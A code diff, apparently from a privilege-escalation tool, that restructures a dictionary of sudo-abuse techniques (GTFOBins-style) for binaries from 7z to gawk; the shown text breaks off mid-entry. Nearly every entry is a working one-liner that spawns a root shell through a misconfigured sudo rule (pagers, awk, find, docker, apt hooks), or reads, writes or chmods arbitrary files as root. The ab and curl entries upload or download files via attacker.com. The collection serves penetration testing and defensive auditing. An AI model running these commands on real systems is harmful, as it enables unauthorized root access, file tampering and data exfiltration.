@@ -21,1150 +21,2046 @@ import select
 # SUDO_BINS_START
 sudo_bins = {
     "7z": [
-        "LFILE=file_to_read\nsudo 7z a -ttar -an -so $LFILE | 7z e -ttar -si -so\n"
+        {
+            "code": "LFILE=file_to_read\nsudo 7z a -ttar -an -so $LFILE | 7z e -ttar -si -so\n"
+        }
     ],
     "aa-exec": [
-        "sudo aa-exec /bin/sh"
+        {
+            "code": "sudo aa-exec /bin/sh"
+        }
     ],
     "ab": [
-        "URL=http://attacker.com/\nLFILE=file_to_send\nsudo ab -p $LFILE $URL\n"
+        {
+            "code": "URL=http://attacker.com/\nLFILE=file_to_send\nsudo ab -p $LFILE $URL\n",
+            "description": "Upload local file via HTTP POST request."
+        }
     ],
     "alpine": [
-        "LFILE=file_to_read\nsudo alpine -F \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\nsudo alpine -F \"$LFILE\"\n"
+        }
     ],
     "ansible-playbook": [
-        "TF=$(mktemp)\necho '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF\nsudo ansible-playbook $TF\n"
+        {
+            "code": "TF=$(mktemp)\necho '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF\nsudo ansible-playbook $TF\n"
+        }
     ],
     "ansible-test": [
-        "sudo ansible-test shell"
+        {
+            "code": "sudo ansible-test shell"
+        }
     ],
     "aoss": [
-        "sudo aoss /bin/sh"
+        {
+            "code": "sudo aoss /bin/sh"
+        }
     ],
     "apt": [
-        "sudo apt changelog apt\n!/bin/sh\n",
-        "TF=$(mktemp)\necho 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > $TF\nsudo apt install -c $TF sl\n",
-        "sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh"
+        {
+            "code": "sudo apt changelog apt\n!/bin/sh\n",
+            "description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
+        },
+        {
+            "code": "TF=$(mktemp)\necho 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > $TF\nsudo apt install -c $TF sl\n",
+            "description": "For this to work the target package (e.g., `sl`) must not be installed."
+        },
+        {
+            "code": "sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh",
+            "description": "When the shell exits the `update` command is actually executed."
+        }
     ],
     "apt-get": [
-        "sudo apt-get changelog apt\n!/bin/sh\n",
-        "TF=$(mktemp)\necho 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > $TF\nsudo apt-get install -c $TF sl\n",
-        "sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh"
+        {
+            "code": "sudo apt-get changelog apt\n!/bin/sh\n",
+            "description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
+        },
+        {
+            "code": "TF=$(mktemp)\necho 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > $TF\nsudo apt-get install -c $TF sl\n",
+            "description": "For this to work the target package (e.g., `sl`) must not be installed."
+        },
+        {
+            "code": "sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh",
+            "description": "When the shell exits the `update` command is actually executed."
+        }
     ],
     "ar": [
-        "TF=$(mktemp -u)\nLFILE=file_to_read\nsudo ar r \"$TF\" \"$LFILE\"\ncat \"$TF\"\n"
+        {
+            "code": "TF=$(mktemp -u)\nLFILE=file_to_read\nsudo ar r \"$TF\" \"$LFILE\"\ncat \"$TF\"\n"
+        }
     ],
     "aria2c": [
-        "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo aria2c --on-download-error=$TF http://x\n"
+        {
+            "code": "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo aria2c --on-download-error=$TF http://x\n"
+        }
     ],
     "arj": [
-        "TF=$(mktemp -d)\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >\"$TF/$LFILE\"\narj a \"$TF/a\" \"$TF/$LFILE\"\nsudo arj e \"$TF/a\" $LDIR\n"
+        {
+            "code": "TF=$(mktemp -d)\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >\"$TF/$LFILE\"\narj a \"$TF/a\" \"$TF/$LFILE\"\nsudo arj e \"$TF/a\" $LDIR\n",
+            "description": "The archive can also be prepared offline then uploaded."
+        }
     ],
     "arp": [
-        "LFILE=file_to_read\nsudo arp -v -f \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\nsudo arp -v -f \"$LFILE\"\n"
+        }
     ],
     "as": [
-        "LFILE=file_to_read\nsudo as @$LFILE\n"
+        {
+            "code": "LFILE=file_to_read\nsudo as @$LFILE\n"
+        }
     ],
     "ascii-xfr": [
-        "LFILE=file_to_read\nsudo ascii-xfr -ns \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\nsudo ascii-xfr -ns \"$LFILE\"\n"
+        }
     ],
     "ascii85": [
-        "LFILE=file_to_read\nsudo ascii85 \"$LFILE\" | ascii85 --decode\n"
+        {
+            "code": "LFILE=file_to_read\nsudo ascii85 \"$LFILE\" | ascii85 --decode\n"
+        }
     ],
     "ash": [
-        "sudo ash"
+        {
+            "code": "sudo ash"
+        }
     ],
     "aspell": [
-        "LFILE=file_to_read\nsudo aspell -c \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\nsudo aspell -c \"$LFILE\"\n"
+        }
     ],
     "at": [
-        "echo \"/bin/sh <$(tty) >$(tty) 2>$(tty)\" | sudo at now; tail -f /dev/null\n"
+        {
+            "code": "echo \"/bin/sh <$(tty) >$(tty) 2>$(tty)\" | sudo at now; tail -f /dev/null\n"
+        }
     ],
     "atobm": [
-        "LFILE=file_to_read\nsudo atobm $LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", $2}'\n"
+        {
+            "code": "LFILE=file_to_read\nsudo atobm $LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", $2}'\n"
+        }
     ],
     "awk": [
-        "sudo awk 'BEGIN {system(\"/bin/sh\")}'"
+        {
+            "code": "sudo awk 'BEGIN {system(\"/bin/sh\")}'"
+        }
     ],
     "aws": [
-        "sudo aws help\n!/bin/sh\n"
+        {
+            "code": "sudo aws help\n!/bin/sh\n",
+            "description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
+        }
     ],
     "base32": [
-        "LFILE=file_to_read\nsudo base32 \"$LFILE\" | base32 --decode\n"
+        {
+            "code": "LFILE=file_to_read\nsudo base32 \"$LFILE\" | base32 --decode\n"
+        }
     ],
     "base58": [
-        "LFILE=file_to_read\nsudo base58 \"$LFILE\" | base58 --decode\n"
+        {
+            "code": "LFILE=file_to_read\nsudo base58 \"$LFILE\" | base58 --decode\n"
+        }
     ],
     "base64": [
-        "LFILE=file_to_read\nsudo base64 \"$LFILE\" | base64 --decode\n"
+        {
+            "code": "LFILE=file_to_read\nsudo base64 \"$LFILE\" | base64 --decode\n"
+        }
     ],
     "basenc": [
-        "LFILE=file_to_read\nsudo basenc --base64 $LFILE | basenc -d --base64\n"
+        {
+            "code": "LFILE=file_to_read\nsudo basenc --base64 $LFILE | basenc -d --base64\n"
+        }
     ],
     "basez": [
-        "LFILE=file_to_read\nsudo basez \"$LFILE\" | basez --decode\n"
+        {
+            "code": "LFILE=file_to_read\nsudo basez \"$LFILE\" | basez --decode\n"
+        }
     ],
     "bash": [
-        "sudo bash"
+        {
+            "code": "sudo bash"
+        }
     ],
     "batcat": [
-        "sudo batcat --paging always /etc/profile\n!/bin/sh\n"
+        {
+            "code": "sudo batcat --paging always /etc/profile\n!/bin/sh\n"
+        }
     ],
     "bc": [
-        "LFILE=file_to_read\nsudo bc -s $LFILE\nquit\n"
+        {
+            "code": "LFILE=file_to_read\nsudo bc -s $LFILE\nquit\n"
+        }
     ],
     "bconsole": [
-        "sudo bconsole\n@exec /bin/sh\n"
+        {
+            "code": "sudo bconsole\n@exec /bin/sh\n"
+        }
     ],
     "bpftrace": [
-        "sudo bpftrace -e 'BEGIN {system(\"/bin/sh\");exit()}'",
-        "TF=$(mktemp)\necho 'BEGIN {system(\"/bin/sh\");exit()}' >$TF\nsudo bpftrace $TF\n",
-        "sudo bpftrace -c /bin/sh -e 'END {exit()}'"
+        {
+            "code": "sudo bpftrace -e 'BEGIN {system(\"/bin/sh\");exit()}'"
+        },
+        {
+            "code": "TF=$(mktemp)\necho 'BEGIN {system(\"/bin/sh\");exit()}' >$TF\nsudo bpftrace $TF\n"
+        },
+        {
+            "code": "sudo bpftrace -c /bin/sh -e 'END {exit()}'"
+        }
     ],
     "bridge": [
-        "LFILE=file_to_read\nsudo bridge -b \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\nsudo bridge -b \"$LFILE\"\n"
+        }
     ],
     "bundle": [
-        "sudo bundle help\n!/bin/sh\n"
+        {
+            "code": "sudo bundle help\n!/bin/sh\n",
+            "description": "This invokes the default pager, which is likely to be  [`less`](/gtfobins/less/), other functions may apply."
+        }
     ],
     "bundler": [
-        "sudo bundler help\n!/bin/sh\n"
+        {
+            "code": "sudo bundler help\n!/bin/sh\n",
+            "description": "This invokes the default pager, which is likely to be  [`less`](/gtfobins/less/), other functions may apply."
+        }
     ],
     "busctl": [
-        "sudo busctl --show-machine\n!/bin/sh\n"
+        {
+            "code": "sudo busctl --show-machine\n!/bin/sh\n"
+        }
     ],
     "busybox": [
-        "sudo busybox sh"
+        {
+            "code": "sudo busybox sh"
+        }
     ],
     "byebug": [
-        "TF=$(mktemp)\necho 'system(\"/bin/sh\")' > $TF\nsudo byebug $TF\ncontinue\n"
+        {
+            "code": "TF=$(mktemp)\necho 'system(\"/bin/sh\")' > $TF\nsudo byebug $TF\ncontinue\n"
+        }
     ],
     "bzip2": [
-        "LFILE=file_to_read\nsudo bzip2 -c $LFILE | bzip2 -d\n"
+        {
+            "code": "LFILE=file_to_read\nsudo bzip2 -c $LFILE | bzip2 -d\n"
+        }
     ],
     "c89": [
-        "sudo c89 -wrapper /bin/sh,-s ."
+        {
+            "code": "sudo c89 -wrapper /bin/sh,-s ."
+        }
     ],
     "c99": [
-        "sudo c99 -wrapper /bin/sh,-s ."
+        {
+            "code": "sudo c99 -wrapper /bin/sh,-s ."
+        }
     ],
     "cabal": [
-        "sudo cabal exec -- /bin/sh"
+        {
+            "code": "sudo cabal exec -- /bin/sh"
+        }
     ],
     "capsh": [
-        "sudo capsh --"
+        {
+            "code": "sudo capsh --"
+        }
     ],
     "cat": [
-        "LFILE=file_to_read\nsudo cat \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\nsudo cat \"$LFILE\"\n"
+        }
     ],
     "cdist": [
-        "sudo cdist shell -s /bin/sh"
+        {
+            "code": "sudo cdist shell -s /bin/sh"
+        }
     ],
     "certbot": [
-        "TF=$(mktemp -d)\nsudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'\n"
+        {
+            "code": "TF=$(mktemp -d)\nsudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'\n"
+        }
     ],
     "check_by_ssh": [
-        "sudo check_by_ssh -o \"ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)\" -H localhost -C xx"
+        {
+            "code": "sudo check_by_ssh -o \"ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)\" -H localhost -C xx",
+            "description": "The shell will only last 10 seconds."
+        }
     ],
     "check_cups": [
-        "LFILE=file_to_read\nsudo check_cups --extra-opts=@$LFILE\n"
+        {
+            "code": "LFILE=file_to_read\nsudo check_cups --extra-opts=@$LFILE\n"
+        }
     ],
     "check_log": [
-        "LFILE=file_to_write\nINPUT=input_file\nsudo check_log -F $INPUT -O $LFILE\n"
+        {
+            "code": "LFILE=file_to_write\nINPUT=input_file\nsudo check_log -F $INPUT -O $LFILE\n"
+        }
     ],
     "check_memory": [
-        "LFILE=file_to_read\nsudo check_memory --extra-opts=@$LFILE\n"
+        {
+            "code": "LFILE=file_to_read\nsudo check_memory --extra-opts=@$LFILE\n"
+        }
     ],
     "check_raid": [
-        "LFILE=file_to_read\nsudo check_raid --extra-opts=@$LFILE\n"
+        {
+            "code": "LFILE=file_to_read\nsudo check_raid --extra-opts=@$LFILE\n"
+        }
     ],
     "check_ssl_cert": [
-        "COMMAND=id\nOUTPUT=output_file\nTF=$(mktemp)\necho \"$COMMAND | tee $OUTPUT\" > $TF\nchmod +x $TF\numask 022\ncheck_ssl_cert --curl-bin $TF -H example.net\ncat $OUTPUT\n"
+        {
+            "code": "COMMAND=id\nOUTPUT=output_file\nTF=$(mktemp)\necho \"$COMMAND | tee $OUTPUT\" > $TF\nchmod +x $TF\numask 022\ncheck_ssl_cert --curl-bin $TF -H example.net\ncat $OUTPUT\n",
+            "description": "The host example.net must return a certificate via TLS"
+        }
     ],
     "check_statusfile": [
-        "LFILE=file_to_read\nsudo check_statusfile $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\nsudo check_statusfile $LFILE\n"
+        }
     ],
     "chmod": [
-        "LFILE=file_to_change\nsudo chmod 6777 $LFILE\n"
+        {
+            "code": "LFILE=file_to_change\nsudo chmod 6777 $LFILE\n"
+        }
     ],
     "choom": [
-        "sudo choom -n 0 /bin/sh"
+        {
+            "code": "sudo choom -n 0 /bin/sh"
+        }
     ],
     "chown": [
-        "LFILE=file_to_change\nsudo chown $(id -un):$(id -gn) $LFILE\n"
+        {
+            "code": "LFILE=file_to_change\nsudo chown $(id -un):$(id -gn) $LFILE\n"
+        }
     ],
     "chroot": [
-        "sudo chroot /\n"
+        {
+            "code": "sudo chroot /\n"
+        }
     ],
     "clamscan": [
-        "LFILE=file_to_read\nTF=$(mktemp -d)\ntouch $TF/empty.yara\nsudo clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\\1/p'\n"
+        {
+            "code": "LFILE=file_to_read\nTF=$(mktemp -d)\ntouch $TF/empty.yara\nsudo clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\\1/p'\n"
+        }
     ],
     "cmp": [
-        "LFILE=file_to_read\nsudo cmp $LFILE /dev/zero -b -l\n"
+        {
+            "code": "LFILE=file_to_read\nsudo cmp $LFILE /dev/zero -b -l\n"
+        }
     ],
     "cobc": [
-        "TF=$(mktemp -d)\necho 'CALL \"SYSTEM\" USING \"/bin/sh\".' > $TF/x\nsudo cobc -xFj --frelax-syntax-checks $TF/x\n"
+        {
+            "code": "TF=$(mktemp -d)\necho 'CALL \"SYSTEM\" USING \"/bin/sh\".' > $TF/x\nsudo cobc -xFj --frelax-syntax-checks $TF/x\n"
+        }
     ],
     "column": [
-        "LFILE=file_to_read\nsudo column $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\nsudo column $LFILE\n"
+        }
     ],
     "comm": [
-        "LFILE=file_to_read\nsudo comm $LFILE /dev/null 2>/dev/null\n"
+        {
+            "code": "LFILE=file_to_read\nsudo comm $LFILE /dev/null 2>/dev/null\n"
+        }
     ],
     "composer": [
-        "TF=$(mktemp -d)\necho '{\"scripts\":{\"x\":\"/bin/sh -i 0<&3 1>&3 2>&3\"}}' >$TF/composer.json\nsudo composer --working-dir=$TF run-script x\n"
+        {
+            "code": "TF=$(mktemp -d)\necho '{\"scripts\":{\"x\":\"/bin/sh -i 0<&3 1>&3 2>&3\"}}' >$TF/composer.json\nsudo composer --working-dir=$TF run-script x\n"
+        }
     ],
     "cowsay": [
-        "TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\nsudo cowsay -f $TF x\n"
+        {
+            "code": "TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\nsudo cowsay -f $TF x\n"
+        }
     ],
     "cowthink": [
-        "TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\nsudo cowthink -f $TF x\n"
+        {
+            "code": "TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\nsudo cowthink -f $TF x\n"
+        }
     ],
     "cp": [
-        "LFILE=file_to_write\necho \"DATA\" | sudo cp /dev/stdin \"$LFILE\"\n",
-        "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo cp $TF $LFILE\n",
-        "sudo cp /bin/sh /bin/cp\nsudo cp\n"
+        {
+            "code": "LFILE=file_to_write\necho \"DATA\" | sudo cp /dev/stdin \"$LFILE\"\n"
+        },
+        {
+            "code": "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo cp $TF $LFILE\n",
+            "description": "This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of `cp` has the `--parents` option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)"
+        },
+        {
+            "code": "sudo cp /bin/sh /bin/cp\nsudo cp\n",
+            "description": "This overrides `cp` itself with a shell (or any other executable) that is to be executed as root, useful in case a `sudo` rule allows to only run `cp` by path. Warning, this is a destructive action."
+        }
     ],
     "cpan": [
-        "sudo cpan\n! exec '/bin/bash'\n"
+        {
+            "code": "sudo cpan\n! exec '/bin/bash'\n"
+        }
     ],
     "cpio": [
-        "echo '/bin/sh </dev/tty >/dev/tty' >localhost\nsudo cpio -o --rsh-command /bin/sh -F localhost:\n",
-        "LFILE=file_to_read\nTF=$(mktemp -d)\necho \"$LFILE\" | sudo cpio -R $UID -dp $TF\ncat \"$TF/$LFILE\"\n",
-        "LFILE=file_to_write\nLDIR=where_to_write\necho DATA >$LFILE\necho $LFILE | sudo cpio -R 0:0 -p $LDIR\n"
+        {
+            "code": "echo '/bin/sh </dev/tty >/dev/tty' >localhost\nsudo cpio -o --rsh-command /bin/sh -F localhost:\n"
+        },
+        {
+            "code": "LFILE=file_to_read\nTF=$(mktemp -d)\necho \"$LFILE\" | sudo cpio -R $UID -dp $TF\ncat \"$TF/$LFILE\"\n",
+            "description": "The whole directory structure is copied to `$TF`."
+        },
+        {
+            "code": "LFILE=file_to_write\nLDIR=where_to_write\necho DATA >$LFILE\necho $LFILE | sudo cpio -R 0:0 -p $LDIR\n",
+            "description": "Copies `$LFILE` to the `$LDIR` directory."
+        }
     ],
     "cpulimit": [
-        "sudo cpulimit -l 100 -f /bin/sh"
+        {
+            "code": "sudo cpulimit -l 100 -f /bin/sh"
+        }
     ],
     "crash": [
-        "sudo crash -h\n!sh\n"
+        {
+            "code": "sudo crash -h\n!sh\n",
+            "description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
+        }
     ],
     "crontab": [
-        "sudo crontab -e"
+        {
+            "code": "sudo crontab -e",
+            "description": "The commands are executed according to the crontab file edited via the `crontab` utility."
+        }
     ],
     "csh": [
-        "sudo csh"
+        {
+            "code": "sudo csh"
+        }
     ],
     "csplit": [
-        "LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01\n"
+        {
+            "code": "LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01\n"
+        }
     ],
     "csvtool": [
-        "sudo csvtool call '/bin/sh;false' /etc/passwd"
+        {
+            "code": "sudo csvtool call '/bin/sh;false' /etc/passwd"
+        }
     ],
     "cupsfilter": [
-        "LFILE=file_to_read\nsudo cupsfilter -i application/octet-stream -m application/octet-stream $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\nsudo cupsfilter -i application/octet-stream -m application/octet-stream $LFILE\n"
+        }
     ],
     "curl": [
-        "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo curl $URL -o $LFILE\n"
+        {
+            "code": "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo curl $URL -o $LFILE\n",
+            "description": "Fetch a remote file via HTTP GET request."
+        }
     ],
     "cut": [
-        "LFILE=file_to_read\nsudo cut -d \"\" -f1 \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\nsudo cut -d \"\" -f1 \"$LFILE\"\n"
+        }
     ],
     "dash": [
-        "sudo dash"
+        {
+            "code": "sudo dash"
+        }
     ],
     "date": [
-        "LFILE=file_to_read\nsudo date -f $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\nsudo date -f $LFILE\n"
+        }
     ],
     "dc": [
-        "sudo dc -e '!/bin/sh'"
+        {
+            "code": "sudo dc -e '!/bin/sh'"
+        }
     ],
     "dd": [
-        "LFILE=file_to_write\necho \"data\" | sudo dd of=$LFILE\n"
+        {
+            "code": "LFILE=file_to_write\necho \"data\" | sudo dd of=$LFILE\n"
+        }
     ],
     "debugfs": [
-        "sudo debugfs\n!/bin/sh\n"
+        {
+            "code": "sudo debugfs\n!/bin/sh\n"
+        }
     ],
     "dialog": [
-        "LFILE=file_to_read\nsudo dialog --textbox \"$LFILE\" 0 0\n"
+        {
+            "code": "LFILE=file_to_read\nsudo dialog --textbox \"$LFILE\" 0 0\n"
+        }
     ],
     "diff": [
-        "LFILE=file_to_read\nsudo diff --line-format=%L /dev/null $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\nsudo diff --line-format=%L /dev/null $LFILE\n"
+        }
     ],
     "dig": [
-        "LFILE=file_to_read\nsudo dig -f $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\nsudo dig -f $LFILE\n"
+        }
     ],
     "distcc": [
-        "sudo distcc /bin/sh"
+        {
+            "code": "sudo distcc /bin/sh"
+        }
     ],
     "dmesg": [
-        "sudo dmesg -H\n!/bin/sh\n"
+        {
+            "code": "sudo dmesg -H\n!/bin/sh\n",
+            "description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
+        }
     ],
     "dmidecode": [
-        "LFILE=file_to_write\nsudo dmidecode --no-sysfs -d x.dmi --dump-bin \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_write\nsudo dmidecode --no-sysfs -d x.dmi --dump-bin \"$LFILE\"\n",
+            "description": "It can be used to overwrite files using a specially crafted SMBIOS file that can be read as a memory device by dmidecode.\nGenerate the file with [dmiwrite](https://github.com/adamreiser/dmiwrite) and upload it to the target.\n\n- `--dump-bin`, will cause dmidecode to write the payload to the destination specified, prepended with 32 null bytes.\n\n- `--no-sysfs`, if the target system is using an older version of dmidecode, you may need to omit the option.\n\n```\nmake dmiwrite\nTF=$(mktemp)\necho \"DATA\" > $TF\n./dmiwrite $TF x.dmi\n```\n"
+        }
     ],
     "dmsetup": [
-        "sudo dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\nsudo dmsetup ls --exec '/bin/sh -s'\n"
+        {
+            "code": "sudo dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\nsudo dmsetup ls --exec '/bin/sh -s'\n"
+        }
     ],
     "dnf": [
-        "sudo dnf install -y x-1.0-1.noarch.rpm\n"
+        {
+            "code": "sudo dnf install -y x-1.0-1.noarch.rpm\n",
+            "description": "It runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n```\nTF=$(mktemp -d)\necho 'id' > $TF/x.sh\nfpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF\n```\n"
+        }
     ],
     "docker": [
-        "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
+        {
+            "code": "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
+            "description": "The resulting is a root shell."
+        }
     ],
     "dosbox": [
-        "LFILE='\\path\\to\\file_to_write'\nsudo dosbox -c 'mount c /' -c \"echo DATA >c:$LFILE\" -c exit\n"
+        {
+            "code": "LFILE='\\path\\to\\file_to_write'\nsudo dosbox -c 'mount c /' -c \"echo DATA >c:$LFILE\" -c exit\n",
+            "description": "Note that the name of the written file in the following example will be `FILE_TO_`. Also note that `echo` terminates the string with a DOS-style line terminator (`\\r\\n`), if that's a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write."
+        }
     ],
     "dotnet": [
-        "sudo dotnet fsi\nSystem.Diagnostics.Process.Start(\"/bin/sh\").WaitForExit();;\n"
+        {
+            "code": "sudo dotnet fsi\nSystem.Diagnostics.Process.Start(\"/bin/sh\").WaitForExit();;\n"
+        }
     ],
     "dpkg": [
-        "sudo dpkg -l\n!/bin/sh\n",
-        "sudo dpkg -i x_1.0_all.deb"
+        {
+            "code": "sudo dpkg -l\n!/bin/sh\n",
+            "description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
+        },
+        {
+            "code": "sudo dpkg -i x_1.0_all.deb",
+            "description": "It runs an interactive shell using a specially crafted Debian package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n```\nTF=$(mktemp -d)\necho 'exec /bin/sh' > $TF/x.sh\nfpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF\n```\n"
+        }
     ],
     "dstat": [
-        "echo 'import os; os.execv(\"/bin/sh\", [\"sh\"])' >/usr/local/share/dstat/dstat_xxx.py\nsudo dstat --xxx\n"
+        {
+            "code": "echo 'import os; os.execv(\"/bin/sh\", [\"sh\"])' >/usr/local/share/dstat/dstat_xxx.py\nsudo dstat --xxx\n"
+        }
     ],
     "dvips": [
-        "tex '\\special{psfile=\"`/bin/sh 1>&0\"}\\end'\nsudo dvips -R0 texput.dvi\n"
+        {
+            "code": "tex '\\special{psfile=\"`/bin/sh 1>&0\"}\\end'\nsudo dvips -R0 texput.dvi\n"
+        }
     ],
     "easy_install": [
-        "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\nsudo easy_install $TF\n"
+        {
+            "code": "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\nsudo easy_install $TF\n"
+        }
     ],
     "eb": [
-        "sudo eb logs\n!/bin/sh\n"
+        {
+            "code": "sudo eb logs\n!/bin/sh\n"
+        }
     ],
     "ed": [
-        "sudo ed\n!/bin/sh\n"
+        {
+            "code": "sudo ed\n!/bin/sh\n"
+        }
     ],
     "efax": [
-        "LFILE=file_to_read\nsudo efax -d \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\nsudo efax -d \"$LFILE\"\n"
+        }
     ],
     "elvish": [
-        "sudo elvish"
+        {
+            "code": "sudo elvish"
+        }
     ],
     "emacs": [
-        "sudo emacs -Q -nw --eval '(term \"/bin/sh\")'"
+        {
+            "code": "sudo emacs -Q -nw --eval '(term \"/bin/sh\")'"
+        }
     ],
     "enscript": [
-        "sudo enscript /dev/null -qo /dev/null -I '/bin/sh >&2'"
+        {
+            "code": "sudo enscript /dev/null -qo /dev/null -I '/bin/sh >&2'"
+        }
     ],
     "env": [
-        "sudo env /bin/sh"
+        {
+            "code": "sudo env /bin/sh"
+        }
     ],
     "eqn": [
-        "LFILE=file_to_read\nsudo eqn \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\nsudo eqn \"$LFILE\"\n"
+        }
     ],
     "espeak": [
-        "LFILE=file_to_read\nsudo espeak -qXf \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\nsudo espeak -qXf \"$LFILE\"\n"
+        }
     ],
     "ex": [
-        "sudo ex\n!/bin/sh\n"
+        {
+            "code": "sudo ex\n!/bin/sh\n"
+        }
     ],
     "exiftool": [
-        "LFILE=file_to_write\nINPUT=input_file\nsudo exiftool -filename=$LFILE $INPUT\n"
+        {
+            "code": "LFILE=file_to_write\nINPUT=input_file\nsudo exiftool -filename=$LFILE $INPUT\n"
+        }
     ],
     "expand": [
-        "LFILE=file_to_read\nsudo expand \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\nsudo expand \"$LFILE\"\n"
+        }
     ],
     "expect": [
-        "sudo expect -c 'spawn /bin/sh;interact'"
+        {
+            "code": "sudo expect -c 'spawn /bin/sh;interact'"
+        }
     ],
     "facter": [
-        "TF=$(mktemp -d)\necho 'exec(\"/bin/sh\")' > $TF/x.rb\nsudo FACTERLIB=$TF facter\n"
+        {
+            "code": "TF=$(mktemp -d)\necho 'exec(\"/bin/sh\")' > $TF/x.rb\nsudo FACTERLIB=$TF facter\n"
+        }
     ],
     "file": [
-        "LFILE=file_to_read\nsudo file -f $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\nsudo file -f $LFILE\n",
+            "description": "Each input line is treated as a filename for the `file` command and the output is corrupted by a suffix `:` followed by the result or the error of the operation, so this may not be suitable for binary files."
+        }
     ],
     "find": [
-        "sudo find . -exec /bin/sh \\; -quit"
+        {
+            "code": "sudo find . -exec /bin/sh \\; -quit"
+        }
     ],
     "fish": [
-        "sudo fish"
+        {
+            "code": "sudo fish"
+        }
     ],
     "flock": [
-        "sudo flock -u / /bin/sh"
+        {
+            "code": "sudo flock -u / /bin/sh"
+        }
     ],
     "fmt": [
-        "LFILE=file_to_read\nsudo fmt -999 \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\nsudo fmt -999 \"$LFILE\"\n",
+            "description": "This corrupts the output by wrapping very long lines at the given width."
+        }
     ],
     "fold": [
-        "LFILE=file_to_read\nsudo fold -w99999999 \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\nsudo fold -w99999999 \"$LFILE\"\n"
+        }
     ],
     "fping": [
-        "LFILE=file_to_read\nsudo fping -f $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\nsudo fping -f $LFILE\n"
+        }
     ],
     "ftp": [
-        "sudo ftp\n!/bin/sh\n"
+        {
+            "code": "sudo ftp\n!/bin/sh\n"
+        }
     ],
     "gawk": [
-        "sudo gawk 'BEGIN {system(\"/bin/sh\")}'"
+        {
